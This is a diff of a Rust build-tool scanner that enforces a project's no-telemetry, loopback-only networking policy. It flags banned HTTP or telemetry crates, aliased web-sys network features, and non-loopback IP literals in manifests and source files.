@@ -1,13 +1,12 @@
 //! `cargo xtask telemetry`: enforce CurveBook's zero-telemetry, zero-cloud, and local-only
 //! networking policy across manifests, Rust sources, workflows, and web security headers (`R0.6`).
 
-use std::collections::BTreeMap;
+use std::collections::{BTreeMap, BTreeSet};
 use std::path::Path;
 
-use crate::rust_lex::{RustLexer, StrippedRust, is_ident_byte, strip_non_prod_rust_both as strip_non_prod_rust};
+use crate::rust_lex::{RustLexer, StrippedRust, is_cfg_test_only_submodule, is_ident_byte, strip_non_prod_rust_both as strip_non_prod_rust};
 use crate::scan_util::{
-    format_error_list, has_ext_ci, is_real_dir, lower_ext, next_ident_pattern_match, rel_slash_lossy, strip_toml_comment, unquote_scalar,
-    walk_file_paths, walk_rel_files,
+    format_error_list, has_ext_ci, is_real_dir, lower_ext, next_ident_pattern_match, rel_slash_lossy, unquote_scalar, walk_file_paths, walk_rel_files,
 };
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -15,22 +14,6 @@ struct LockPackage {
     name: String,
     version: String,
     source: Option<String>,
-}
-
-fn parse_section_header(line: &str) -> Option<&str> {
-    if line.starts_with("[[") {
-        return None;
-    }
-    line.strip_prefix('[')?.strip_suffix(']').map(str::trim)
-}
-
-fn extract_first_quoted(s: &str) -> String {
-    for quote in ['"', '\''] {
-        if let Some(rest) = s.strip_prefix(quote) {
-            return rest.split(quote).next().unwrap_or("").to_owned();
-        }
-    }
-    String::new()
 }
 
 fn parse_cargo_lock(lock_text: &str) -> Vec<LockPackage> {
@@ -217,10 +200,17 @@ fn check_banned_crates(root: &Path, violations: &mut Vec<TelemetryViolation>, lo
         return Err(String::from("no Cargo.toml manifests found in workspace"));
     }
 
+    let mut workspace_web_sys_aliases = BTreeSet::new();
+    let root_cargo = root.join("Cargo.toml");
+    if root_cargo.is_file() {
+        let root_text = std::fs::read_to_string(&root_cargo).map_err(|e| format!("Cargo.toml: {e}"))?;
+        workspace_web_sys_aliases = collect_workspace_web_sys_aliases(&root_text);
+    }
+
     for manifest in &manifests {
         let rel = rel_slash_lossy(root, manifest);
         let text = std::fs::read_to_string(manifest).map_err(|e| format!("{rel}: {e}"))?;
-        scan_manifest_for_banned_crates(&rel, &text, violations);
+        scan_manifest_for_banned_crates(&rel, &text, &workspace_web_sys_aliases, violations);
     }
 
     let lock_path = root.join("Cargo.lock");
@@ -232,138 +222,164 @@ fn check_banned_crates(root: &Path, violations: &mut Vec<TelemetryViolation>, lo
     Ok(manifests.len())
 }
 
-fn scan_manifest_for_banned_crates(rel: &str, toml: &str, violations: &mut Vec<TelemetryViolation>) {
-    let mut section = String::new();
-    let mut brace_depth = 0i32;
-    let mut bracket_depth = 0i32;
-    let mut in_dep_inline = false;
-    let mut in_web_sys_entry = false;
+fn norm_crate_ident(raw: &str) -> String {
+    raw.trim().to_ascii_lowercase().replace('_', "-")
+}
 
-    for (idx, raw) in toml.lines().enumerate() {
-        let line_no = idx + 1;
-        let line = strip_toml_comment(raw).trim();
-        if line.is_empty() {
-            continue;
-        }
-        if brace_depth <= 0 && bracket_depth <= 0 {
-            in_dep_inline = false;
-            in_web_sys_entry = false;
-            if let Some(sec) = parse_section_header(line) {
-                section = sec.to_owned();
-                if let Some(dep_name) = section_dependency_name(&section)
-                    && is_banned_crate_name(dep_name)
-                {
-                    push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{dep_name}` in section `[{section}]`"));
-                }
-                continue;
-            }
-        }
-        if !is_dependency_section(&section) {
-            update_toml_nesting(line, &mut brace_depth, &mut bracket_depth);
-            continue;
-        }
+fn is_web_sys_name(name: &str, aliases: &BTreeSet<String>) -> bool {
+    let norm = norm_crate_ident(name);
+    norm == "web-sys" || aliases.contains(&norm)
+}
 
-        if brace_depth > 0 || bracket_depth > 0 {
-            if in_dep_inline
-                && let Some(pkg) = extract_inline_package_name(line, true)
-                && is_banned_crate_name(&pkg)
-            {
-                push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{pkg}` (aliased via `package =`)"));
-            }
-            if in_web_sys_entry {
-                for feat in extract_banned_web_sys_features(line) {
-                    push_v(violations, 1, rel, line_no, format!("banned `web-sys` network feature `{feat}` in `Cargo.toml`"));
-                }
-            }
-            update_toml_nesting(line, &mut brace_depth, &mut bracket_depth);
-            if brace_depth <= 0 && bracket_depth <= 0 {
-                in_dep_inline = false;
-                in_web_sys_entry = false;
-            }
-            continue;
-        }
-
-        let Some((lhs, rhs)) = line.split_once('=') else {
-            update_toml_nesting(line, &mut brace_depth, &mut bracket_depth);
-            continue;
-        };
-        let key = unquote_scalar(lhs);
-        let rhs = rhs.trim();
-        let is_web_sys_section =
-            section_dependency_name(&section).is_some_and(|n| n.eq_ignore_ascii_case("web-sys") || n.eq_ignore_ascii_case("web_sys"));
-        if key != "package" && is_banned_crate_name(key) {
-            push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{key}` in `Cargo.toml`"));
-        }
-        if (key == "package" && section_dependency_name(&section).is_some()) || rhs.starts_with('{') {
-            let pkg_opt = if key == "package" { Some(unquote_scalar(rhs).to_owned()) } else { extract_inline_package_name(rhs, false) };
-            if let Some(pkg) = pkg_opt
-                && is_banned_crate_name(&pkg)
-            {
-                push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{pkg}` (aliased via `package =`)"));
-            }
-        }
-        let is_web_sys_line = key == "web-sys" || key == "web_sys" || (is_web_sys_section && key == "features");
-        if is_web_sys_line {
-            for feat in extract_banned_web_sys_features(rhs) {
-                push_v(violations, 1, rel, line_no, format!("banned `web-sys` network feature `{feat}` in `Cargo.toml`"));
-            }
-        }
-        update_toml_nesting(line, &mut brace_depth, &mut bracket_depth);
-        if brace_depth > 0 || bracket_depth > 0 {
-            in_dep_inline = rhs.starts_with('{') || brace_depth > 0;
-            in_web_sys_entry = is_web_sys_line;
-        }
+fn dep_path_parts(path: &[String]) -> Option<(&str, Option<&str>)> {
+    match path {
+        [first, dep] if is_dep_table_keyword(first) => Some((dep.as_str(), None)),
+        [first, dep, sub, ..] if is_dep_table_keyword(first) => Some((dep.as_str(), Some(sub.as_str()))),
+        [w, d, dep] if w == "workspace" && d == "dependencies" => Some((dep.as_str(), None)),
+        [w, d, dep, sub, ..] if w == "workspace" && d == "dependencies" => Some((dep.as_str(), Some(sub.as_str()))),
+        [t, _, d, dep] if t == "target" && is_dep_table_keyword(d) => Some((dep.as_str(), None)),
+        [t, _, d, dep, sub, ..] if t == "target" && is_dep_table_keyword(d) => Some((dep.as_str(), Some(sub.as_str()))),
+        _ => None,
     }
 }
 
-fn update_toml_nesting(line: &str, brace_depth: &mut i32, bracket_depth: &mut i32) {
-    let mut quote: Option<u8> = None;
-    let bytes = line.as_bytes();
-    let mut i = 0usize;
-    while i < bytes.len() {
-        let b = bytes[i];
-        if let Some(q) = quote {
-            if b == b'\\' && q == b'"' {
-                i += 2;
-                continue;
-            }
-            if b == q {
-                quote = None;
-            }
-        } else {
-            match b {
-                b'"' | b'\'' => quote = Some(b),
-                b'{' => *brace_depth += 1,
-                b'}' => *brace_depth = (*brace_depth - 1).max(0),
-                b'[' => *bracket_depth += 1,
-                b']' => *bracket_depth = (*bracket_depth - 1).max(0),
-                _ => {}
-            }
-        }
-        i += 1;
-    }
-}
-
-fn extract_banned_web_sys_features(rhs: &str) -> Vec<String> {
-    let mut hits = Vec::new();
-    let mut pos = 0usize;
-    let bytes = rhs.as_bytes();
-    while pos < bytes.len() {
-        let q = bytes[pos];
-        if (q == b'"' || q == b'\'')
-            && let Some(end) = rhs.get(pos + 1..).and_then(|s| s.find(char::from(q)))
+fn collect_workspace_web_sys_aliases(root_toml: &str) -> BTreeSet<String> {
+    let mut aliases = BTreeSet::new();
+    for entry in crate::scan_util::parse_toml_entries(root_toml) {
+        if let crate::scan_util::TomlEntry::Leaf { path, value, .. } = entry
+            && path.len() >= 4
+            && path[0] == "workspace"
+            && path[1] == "dependencies"
+            && path[3] == "package"
+            && value.as_str().is_some_and(|pkg| norm_crate_ident(pkg) == "web-sys")
         {
-            let val = rhs.get(pos + 1..pos + 1 + end).unwrap_or("");
-            let lower = val.trim().to_ascii_lowercase();
-            if BANNED_WEB_SYS_NET_FEATURES.contains(&lower.as_str()) {
-                hits.push(val.trim().to_owned());
-            }
-            pos = pos + 1 + end + 1;
-            continue;
+            aliases.insert(norm_crate_ident(&path[2]));
         }
-        pos += 1;
     }
-    hits
+    aliases
+}
+
+fn check_feature_forwarding_value(
+    rel: &str,
+    line_no: usize,
+    value: &crate::scan_util::TomlVal,
+    web_sys_aliases: &BTreeSet<String>,
+    violations: &mut Vec<TelemetryViolation>,
+) {
+    let mut items = Vec::new();
+    value.collect_strings(&mut items);
+    for item in items {
+        let trimmed = item.trim();
+        if let Some(dep_only) = trimmed.strip_prefix("dep:") {
+            let dep_name = dep_only.split('/').next().unwrap_or(dep_only).trim_end_matches('?');
+            if is_banned_crate_name(dep_name) {
+                push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{dep_name}` activated in `[features]`"));
+            }
+        }
+        if let Some((raw_dep, feat)) = trimmed.split_once('/') {
+            let dep_name = raw_dep.strip_prefix("dep:").unwrap_or(raw_dep).trim_end_matches('?').trim();
+            if is_banned_crate_name(dep_name) {
+                push_v(violations, 1, rel, line_no, format!("banned telemetry/HTTP crate `{dep_name}` activated in `[features]`"));
+            }
+            if is_web_sys_name(dep_name, web_sys_aliases) {
+                let lower_feat = feat.trim().to_ascii_lowercase();
+                if BANNED_WEB_SYS_NET_FEATURES.contains(&lower_feat.as_str()) {
+                    push_v(
+                        violations,
+                        1,
+                        rel,
+                        line_no,
+                        format!("banned `web-sys` network feature `{}` activated via `[features]` (`{trimmed}`)", feat.trim()),
+                    );
+                }
+            }
+        }
+    }
+}
+
+fn scan_manifest_for_banned_crates(rel: &str, toml: &str, workspace_web_sys_aliases: &BTreeSet<String>, violations: &mut Vec<TelemetryViolation>) {
+    let entries = crate::scan_util::parse_toml_entries(toml);
+    let mut dep_table_pkg: BTreeMap<Vec<String>, String> = BTreeMap::new();
+    let mut local_web_sys_aliases: BTreeSet<String> = BTreeSet::new();
+    let mut local_ws_inherited_aliases: BTreeSet<String> = BTreeSet::new();
+    let mut local_non_web_sys_aliases: BTreeSet<String> = BTreeSet::new();
+    for entry in &entries {
+        if let crate::scan_util::TomlEntry::Leaf { path, value, .. } = entry
+            && let Some((dep, Some(sub))) = dep_path_parts(path)
+        {
+            let dep_norm = norm_crate_ident(dep);
+            if sub == "package"
+                && let Some(pkg) = value.as_str()
+            {
+                let pkg_norm = norm_crate_ident(pkg);
+                if let Some(table_prefix) = path.get(..path.len().saturating_sub(1)) {
+                    dep_table_pkg.insert(table_prefix.to_vec(), pkg_norm.clone());
+                }
+                if pkg_norm == "web-sys" {
+                    local_web_sys_aliases.insert(dep_norm);
+                } else {
+                    local_non_web_sys_aliases.insert(dep_norm);
+                }
+            } else if sub == "workspace" && matches!(value, crate::scan_util::TomlVal::Other(s) if s == "true") {
+                local_ws_inherited_aliases.insert(dep_norm);
+            }
+        }
+    }
+    let mut web_sys_aliases = workspace_web_sys_aliases.clone();
+    web_sys_aliases.extend(local_web_sys_aliases.iter().cloned());
+    for shadowed in &local_non_web_sys_aliases {
+        if !local_web_sys_aliases.contains(shadowed) && !local_ws_inherited_aliases.contains(shadowed) {
+            web_sys_aliases.remove(shadowed);
+        }
+    }
+
+    let mut seen_dep_hits: BTreeSet<(usize, String)> = BTreeSet::new();
+    for entry in &entries {
+        match entry {
+            crate::scan_util::TomlEntry::Section { line, path } => {
+                if let Some((dep, None)) = dep_path_parts(path)
+                    && is_banned_crate_name(dep)
+                    && seen_dep_hits.insert((*line, norm_crate_ident(dep)))
+                {
+                    push_v(violations, 1, rel, *line, format!("banned telemetry/HTTP crate `{dep}` in section `[{}]`", path.join(".")));
+                }
+            }
+            crate::scan_util::TomlEntry::Leaf { line, path, value } => {
+                if path.first().map(String::as_str) == Some("features") {
+                    check_feature_forwarding_value(rel, *line, value, &web_sys_aliases, violations);
+                    continue;
+                }
+                let Some((dep, sub)) = dep_path_parts(path) else {
+                    continue;
+                };
+                if dep != "package" && is_banned_crate_name(dep) && seen_dep_hits.insert((*line, norm_crate_ident(dep))) {
+                    push_v(violations, 1, rel, *line, format!("banned telemetry/HTTP crate `{dep}` in `Cargo.toml`"));
+                }
+                if sub == Some("package")
+                    && let Some(pkg) = value.as_str()
+                    && is_banned_crate_name(pkg)
+                {
+                    push_v(violations, 1, rel, *line, format!("banned telemetry/HTTP crate `{pkg}` (aliased via `package =`)"));
+                }
+                if sub == Some("features") {
+                    let is_ws = path
+                        .get(..path.len().saturating_sub(1))
+                        .and_then(|pfx| dep_table_pkg.get(pfx))
+                        .map_or_else(|| is_web_sys_name(dep, &web_sys_aliases), |pkg| pkg == "web-sys");
+                    if is_ws {
+                        let mut feats = Vec::new();
+                        value.collect_strings(&mut feats);
+                        for val in feats {
+                            let lower = val.trim().to_ascii_lowercase();
+                            if BANNED_WEB_SYS_NET_FEATURES.contains(&lower.as_str()) {
+                                push_v(violations, 1, rel, *line, format!("banned `web-sys` network feature `{}` in `Cargo.toml`", val.trim()));
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
 }
 
 fn scan_lock_for_banned_crates(lock_text: &str, lock_pkgs: &[LockPackage], violations: &mut Vec<TelemetryViolation>) {
@@ -397,7 +413,7 @@ fn scan_lock_for_banned_crates(lock_text: &str, lock_pkgs: &[LockPackage], viola
 
 #[must_use]
 pub fn is_banned_crate_name(raw: &str) -> bool {
-    let norm = raw.trim().to_ascii_lowercase().replace('_', "-");
+    let norm = norm_crate_ident(raw);
     if norm.is_empty() {
         return false;
     }
@@ -411,53 +427,8 @@ pub fn is_banned_crate_name(raw: &str) -> bool {
         || WILDCARD_PREFIXES.iter().any(|p| norm.starts_with(p))
 }
 
-fn section_dependency_name(section: &str) -> Option<&str> {
-    for prefix in ["dependencies.", "dev-dependencies.", "build-dependencies.", "workspace.dependencies."] {
-        if let Some(rest) = section.strip_prefix(prefix) {
-            return rest.split('.').next().filter(|s| !s.is_empty());
-        }
-    }
-    for marker in [".dependencies.", ".dev-dependencies.", ".build-dependencies."] {
-        if let Some((_, rest)) = section.split_once(marker) {
-            return rest.split('.').next().filter(|s| !s.is_empty());
-        }
-    }
-    None
-}
-
-fn is_dependency_section(section: &str) -> bool {
-    section == "dependencies"
-        || section == "dev-dependencies"
-        || section == "build-dependencies"
-        || section == "workspace.dependencies"
-        || section.ends_with(".dependencies")
-        || section.ends_with(".dev-dependencies")
-        || section.ends_with(".build-dependencies")
-        || section_dependency_name(section).is_some()
-}
-
-fn extract_inline_package_name(rhs: &str, inside_inline: bool) -> Option<String> {
-    if !inside_inline && !rhs.starts_with('{') {
-        return None;
-    }
-    let mut pos = 0;
-    while let Some(rel) = rhs.get(pos..).and_then(|s| s.find("package")) {
-        let hit = pos + rel;
-        let left_ok = hit == 0 || !is_ident_byte(rhs.as_bytes()[hit - 1]);
-        let after = rhs.get(hit + "package".len()..).unwrap_or("");
-        let right_ok = after.starts_with(|c: char| c.is_ascii_whitespace() || c == '=');
-        if left_ok
-            && right_ok
-            && let Some((_, val_part)) = after.split_once('=')
-        {
-            let trimmed = val_part.trim();
-            if trimmed.starts_with('"') || trimmed.starts_with('\'') {
-                return Some(extract_first_quoted(trimmed));
-            }
-        }
-        pos = hit + 1;
-    }
-    None
+fn is_dep_table_keyword(seg: &str) -> bool {
+    matches!(seg, "dependencies" | "dev-dependencies" | "build-dependencies")
 }
 
 /// Check 2: scan non-test Rust sources under `crates/**/src/**/*.rs` and `apps/**/src/**/*.rs`.
@@ -644,7 +615,7 @@ fn check_allowlisted_net_file(rel: &str, stripped: &StrippedRust, scoped_hits: &
 
     let fn_spans = collect_rust_fn_spans(&stripped.prod_code);
     let mut checked_fn_sockets = 0usize;
-    for (start, end, line_no) in fn_spans {
+    for &(start, end, line_no) in &fn_spans {
         let Some(fn_prod) = stripped.prod_code.get(start..end) else {
             continue;
         };
@@ -671,9 +642,51 @@ fn check_allowlisted_net_file(rel: &str, stripped: &StrippedRust, scoped_hits: &
                 detail: format!("non-loopback socket literal `{bad_ip}` in allowlisted network function"),
             });
         }
+        if let Some((ip_line, bad_ip)) = find_non_loopback_numeric_ip(fn_prod, line_no) {
+            violations.push(TelemetryViolation {
+                check: 2,
+                path: rel.to_owned(),
+                line: ip_line,
+                detail: format!("non-loopback numeric IP `{bad_ip}` in allowlisted network function"),
+            });
+        }
     }
 
-    if checked_fn_sockets == 0 && !scoped_hits.is_empty() && !slice_has_loopback_guard(&stripped.prod_code, &stripped.no_comments_code) {
+    // Also inspect module-level code outside all `fn` bodies (e.g. `static EXFIL: LazyLock<...>`).
+    let (outside_prod, outside_lits) = mask_spans_preserving_lines(&stripped.prod_code, &stripped.no_comments_code, &fn_spans);
+    if fn_opens_socket(&outside_prod) {
+        let outside_line = outside_prod
+            .lines()
+            .enumerate()
+            .find(|(_, l)| l.contains("TcpStream") || l.contains("TcpListener") || l.contains("bind(") || l.contains("connect"))
+            .map_or(1, |(idx, _)| idx + 1);
+        if !slice_has_loopback_guard(&outside_prod, &outside_lits) {
+            violations.push(TelemetryViolation {
+                check: 2,
+                path: rel.to_owned(),
+                line: outside_line,
+                detail: String::from(
+                    "allowlisted module-level network initializer lacks a loopback guard (`is_loopback`, `[127, 0, 0, 1]`, `127.0.0.1`, `::1`, or `LOCALHOST`)",
+                ),
+            });
+        }
+        if let Some((ip_line, bad_ip)) = find_non_loopback_ip_literal(&outside_lits, 1) {
+            violations.push(TelemetryViolation {
+                check: 2,
+                path: rel.to_owned(),
+                line: ip_line,
+                detail: format!("non-loopback socket literal `{bad_ip}` in allowlisted module-level initializer"),
+            });
+        }
+        if let Some((ip_line, bad_ip)) = find_non_loopback_numeric_ip(&outside_prod, 1) {
+            violations.push(TelemetryViolation {
+                check: 2,
+                path: rel.to_owned(),
+                line: ip_line,
+                detail: format!("non-loopback numeric IP `{bad_ip}` in allowlisted module-level initializer"),
+            });
+        }
+    } else if checked_fn_sockets == 0 && !scoped_hits.is_empty() && !slice_has_loopback_guard(&stripped.prod_code, &stripped.no_comments_code) {
         violations.push(TelemetryViolation {
             check: 2,
             path: rel.to_owned(),
@@ -683,6 +696,24 @@ fn check_allowlisted_net_file(rel: &str, stripped: &StrippedRust, scoped_hits: &
             ),
         });
     }
+}
+
+fn mask_spans_preserving_lines(prod_code: &str, lits_code: &str, spans: &[(usize, usize, usize)]) -> (String, String) {
+    let mut prod = prod_code.as_bytes().to_vec();
+    let mut lits = lits_code.as_bytes().to_vec();
+    for &(start, end, _) in spans {
+        for buf in [&mut prod, &mut lits] {
+            for b in buf.iter_mut().take(end).skip(start) {
+                if *b != b'\n' {
+                    *b = b' ';
+                }
+            }
+        }
+    }
+    (
+        String::from_utf8(prod).unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned()),
+        String::from_utf8(lits).unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned()),
+    )
 }
 
 fn check_net_alias_imports(rel: &str, prod_code: &str, violations: &mut Vec<TelemetryViolation>) {
@@ -841,6 +872,267 @@ fn find_non_loopback_ip_literal(fn_lits: &str, base_line: usize) -> Option<(usiz
     None
 }
 
+/// Detect non-loopback numeric IP constructors in production Rust code (e.g.,
+/// `Ipv4Addr::UNSPECIFIED`, `Ipv6Addr::UNSPECIFIED`, `Ipv4Addr::new((8), 8, 8, 8)`,
+/// `Ipv4Addr::from(0)`, `Ipv6Addr::from_bits(0)`, `([0; 4], 9000)`, `([0, 0, ..., 0], 443)`).
+fn find_non_loopback_numeric_ip(fn_prod: &str, base_line: usize) -> Option<(usize, String)> {
+    let (compact, lines) = crate::layers::collapse_colon_whitespace(fn_prod);
+    for pat in ["Ipv4Addr::UNSPECIFIED", "Ipv6Addr::UNSPECIFIED", "Ipv4Addr::BROADCAST"] {
+        if let Some((pos, _)) = next_ident_pattern_match(&compact, 0, &[pat]) {
+            let ln = base_line + lines.get(pos).copied().unwrap_or(1).saturating_sub(1);
+            return Some((ln, pat.to_owned()));
+        }
+    }
+    let compact_bytes = compact.as_bytes();
+    for (ctor, expected_count, loopback_check) in [
+        ("Ipv4Addr::new", 4usize, is_loopback_ipv4_octets as fn(&[u128]) -> bool),
+        ("Ipv6Addr::new", 8usize, is_loopback_ipv6_segments as fn(&[u128]) -> bool),
+    ] {
+        let mut search = 0usize;
+        while let Some(rel) = compact.get(search..).and_then(|s| s.find(ctor)) {
+            let pos = search + rel;
+            let mut open_paren = pos + ctor.len();
+            while open_paren < compact_bytes.len() && compact_bytes[open_paren].is_ascii_whitespace() {
+                open_paren += 1;
+            }
+            if compact_bytes.get(open_paren) == Some(&b'(')
+                && let Some(close_paren) = find_matching_delim(&compact, open_paren, b'(', b')')
+            {
+                let inside = compact.get(open_paren + 1..close_paren).unwrap_or("");
+                if let Some(nums) = parse_numeric_tuple_args(inside, expected_count)
+                    && !loopback_check(&nums)
+                {
+                    let ln = base_line + lines.get(pos).copied().unwrap_or(1).saturating_sub(1);
+                    return Some((ln, format!("{ctor}({inside})")));
+                }
+            }
+            search = pos + ctor.len();
+        }
+    }
+    for (ctor, is_v6) in [("Ipv4Addr::from", false), ("Ipv4Addr::from_bits", false), ("Ipv6Addr::from", true), ("Ipv6Addr::from_bits", true)] {
+        let mut search = 0usize;
+        while let Some(rel) = compact.get(search..).and_then(|s| s.find(ctor)) {
+            let pos = search + rel;
+            let mut open_paren = pos + ctor.len();
+            while open_paren < compact_bytes.len() && compact_bytes[open_paren].is_ascii_whitespace() {
+                open_paren += 1;
+            }
+            if compact_bytes.get(open_paren) == Some(&b'(')
+                && let Some(close_paren) = find_matching_delim(&compact, open_paren, b'(', b')')
+            {
+                let inside = unwrap_outer_parens(compact.get(open_paren + 1..close_paren).unwrap_or(""));
+                let is_non_loopback = if let Some(arr_inner) = inside.strip_prefix('[').and_then(|s| s.strip_suffix(']')) {
+                    parse_rust_int_array(arr_inner).is_some_and(|nums| is_non_loopback_ip_array(&nums, Some(is_v6)))
+                } else if let Some(bits) = parse_rust_int_u128(inside) {
+                    if is_v6 {
+                        !std::net::Ipv6Addr::from(bits).is_loopback()
+                    } else {
+                        u32::try_from(bits).is_ok_and(|v| !std::net::Ipv4Addr::from(v).is_loopback())
+                    }
+                } else {
+                    false
+                };
+                if is_non_loopback {
+                    let ln = base_line + lines.get(pos).copied().unwrap_or(1).saturating_sub(1);
+                    return Some((ln, format!("{ctor}({inside})")));
+                }
+            }
+            search = pos + ctor.len();
+        }
+    }
+    // Check IPv4 (4-byte), IPv6 (8-u16 or 16-byte), and repeat-array `[v; 4|8|16]` literals in
+    // socket tuple `([...], port)` or `IpAddr::from([...])` / `Ipv{4,6}Addr::from([...])` context,
+    // unwrapping arbitrary surrounding parentheses `(([0; 4]))`.
+    let bytes = compact.as_bytes();
+    let mut i = 0usize;
+    while i < bytes.len() {
+        if bytes[i] == b'['
+            && let Some(close_idx) = find_matching_delim(&compact, i, b'[', b']')
+        {
+            let inner = compact.get(i + 1..close_idx).unwrap_or("");
+            if let Some(nums) = parse_rust_int_array(inner)
+                && is_non_loopback_ip_array(&nums, None)
+            {
+                let mut left = i;
+                let mut right = close_idx + 1;
+                let mut matched = false;
+                loop {
+                    let before = compact.get(..left).unwrap_or("").trim_end();
+                    let after = compact.get(right..).unwrap_or("").trim_start();
+                    let in_sock_tuple = before.ends_with('(') && after.starts_with(',');
+                    let in_ip_from = before
+                        .strip_suffix('(')
+                        .map(str::trim_end)
+                        .is_some_and(|b| b.ends_with("IpAddr::from") || b.ends_with("Ipv4Addr::from") || b.ends_with("Ipv6Addr::from"));
+                    if in_sock_tuple || in_ip_from {
+                        matched = true;
+                        break;
+                    }
+                    if before.ends_with('(') && after.starts_with(')') {
+                        left = before.len() - 1;
+                        right = compact.len() - after.len() + 1;
+                    } else {
+                        break;
+                    }
+                }
+                if matched {
+                    let ln = base_line + lines.get(i).copied().unwrap_or(1).saturating_sub(1);
+                    return Some((ln, format!("[{inner}]")));
+                }
+            }
+        }
+        i += 1;
+    }
+    None
+}
+
+fn find_matching_delim(s: &str, open_pos: usize, open: u8, close: u8) -> Option<usize> {
+    let bytes = s.as_bytes();
+    if bytes.get(open_pos) != Some(&open) {
+        return None;
+    }
+    let mut depth = 1usize;
+    let mut i = open_pos + 1;
+    while i < bytes.len() {
+        if bytes[i] == open {
+            depth += 1;
+        } else if bytes[i] == close {
+            depth -= 1;
+            if depth == 0 {
+                return Some(i);
+            }
+        }
+        i += 1;
+    }
+    None
+}
+
+fn unwrap_outer_parens(raw: &str) -> &str {
+    let mut cur = raw.trim();
+    while cur.starts_with('(') && find_matching_delim(cur, 0, b'(', b')') == Some(cur.len() - 1) {
+        cur = cur.get(1..cur.len() - 1).unwrap_or(cur).trim();
+    }
+    cur
+}
+
+fn split_top_level_delim(s: &str, sep: u8) -> Vec<&str> {
+    let bytes = s.as_bytes();
+    let mut out = Vec::new();
+    let mut start = 0usize;
+    let mut paren = 0usize;
+    let mut bracket = 0usize;
+    for (i, &b) in bytes.iter().enumerate() {
+        match b {
+            b'(' => paren += 1,
+            b')' => paren = paren.saturating_sub(1),
+            b'[' => bracket += 1,
+            b']' => bracket = bracket.saturating_sub(1),
+            _ if b == sep && paren == 0 && bracket == 0 => {
+                out.push(s.get(start..i).unwrap_or("").trim());
+                start = i + 1;
+            }
+            _ => {}
+        }
+    }
+    out.push(s.get(start..).unwrap_or("").trim());
+    out
+}
+
+fn parse_rust_int_u128(raw: &str) -> Option<u128> {
+    let mut cur = raw.trim();
+    loop {
+        let unwrapped = unwrap_outer_parens(cur);
+        let stripped_cast = ["u8", "u16", "u32", "u64", "u128", "usize", "i8", "i16", "i32", "i64", "i128", "isize"].iter().find_map(|ty| {
+            let before_ty = unwrapped.strip_suffix(ty)?;
+            let before_ws = before_ty.trim_end();
+            if before_ws.len() == before_ty.len() {
+                return None;
+            }
+            let before_as = before_ws.strip_suffix("as")?;
+            if before_as.is_empty() || before_as.as_bytes().last().is_some_and(|b| is_ident_byte(*b)) {
+                return None;
+            }
+            Some(before_as.trim_end())
+        });
+        let next = stripped_cast.unwrap_or(unwrapped);
+        if next == cur {
+            break;
+        }
+        cur = next;
+    }
+    let no_suffix = ["u128", "u64", "u32", "u16", "u8", "usize", "i128", "i64", "i32", "i16", "i8", "isize"]
+        .iter()
+        .find_map(|sfx| cur.strip_suffix(sfx))
+        .unwrap_or(cur);
+    let cleaned = no_suffix.replace('_', "");
+    if cleaned.is_empty() {
+        return None;
+    }
+    if let Some(hex) = cleaned.strip_prefix("0x").or_else(|| cleaned.strip_prefix("0X")) {
+        u128::from_str_radix(hex, 16).ok()
+    } else if let Some(bin) = cleaned.strip_prefix("0b").or_else(|| cleaned.strip_prefix("0B")) {
+        u128::from_str_radix(bin, 2).ok()
+    } else if let Some(oct) = cleaned.strip_prefix("0o").or_else(|| cleaned.strip_prefix("0O")) {
+        u128::from_str_radix(oct, 8).ok()
+    } else {
+        cleaned.parse::<u128>().ok()
+    }
+}
+
+fn parse_rust_int_array(inner: &str) -> Option<Vec<u128>> {
+    let semi_parts = split_top_level_delim(inner, b';');
+    if semi_parts.len() == 2 {
+        let val = parse_rust_int_u128(semi_parts[0])?;
+        let count = usize::try_from(parse_rust_int_u128(semi_parts[1])?).ok()?;
+        if matches!(count, 4 | 8 | 16) {
+            return Some(vec![val; count]);
+        }
+        return None;
+    }
+    let parts: Vec<&str> = split_top_level_delim(inner, b',').into_iter().filter(|s| !s.is_empty()).collect();
+    if !matches!(parts.len(), 4 | 8 | 16) {
+        return None;
+    }
+    let mut nums = Vec::with_capacity(parts.len());
+    for p in parts {
+        nums.push(parse_rust_int_u128(p)?);
+    }
+    Some(nums)
+}
+
+fn is_non_loopback_ip_array(nums: &[u128], expect_v6: Option<bool>) -> bool {
+    match (nums.len(), expect_v6) {
+        (4, None | Some(false)) => nums.iter().all(|&n| n <= 255) && !is_loopback_ipv4_octets(nums),
+        (8, None | Some(true)) => nums.iter().all(|&n| n <= 0xFFFF) && !is_loopback_ipv6_segments(nums),
+        (16, None | Some(true)) => nums.iter().all(|&n| n <= 255) && !is_loopback_ipv6_bytes(nums),
+        _ => false,
+    }
+}
+
+fn parse_numeric_tuple_args(inside: &str, expected: usize) -> Option<Vec<u128>> {
+    let parts: Vec<&str> = split_top_level_delim(inside, b',').into_iter().filter(|s| !s.is_empty()).collect();
+    if parts.len() != expected {
+        return None;
+    }
+    let mut nums = Vec::with_capacity(expected);
+    for p in parts {
+        nums.push(parse_rust_int_u128(p)?);
+    }
+    Some(nums)
+}
+
+fn is_loopback_ipv4_octets(octets: &[u128]) -> bool {
+    octets.first() == Some(&127)
+}
+
+fn is_loopback_ipv6_segments(segs: &[u128]) -> bool {
+    segs == [0, 0, 0, 0, 0, 0, 0, 1]
+}
+
+fn is_loopback_ipv6_bytes(bytes: &[u128]) -> bool {
+    bytes == [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]
+}
+
 fn check_non_loopback_host_or_ip(lit: &str) -> Option<String> {
     let trimmed = lit.trim();
     if trimmed.is_empty() {
@@ -905,7 +1197,7 @@ fn collect_non_test_src_rs_files(root: &Path, dir: &Path, out: &mut Vec<String>)
     walk_file_paths(dir, &skip_workspace_dir, &|p| has_ext_ci(p, &["rs"]), &mut paths)?;
     for path in paths {
         let rel = rel_slash_lossy(root, &path);
-        let is_prod_src = rel.contains("/src/") && !rel.contains("/tests/") && !rel.ends_with("_test.rs");
+        let is_prod_src = rel.contains("/src/") && !is_cfg_test_only_submodule(root, &rel);
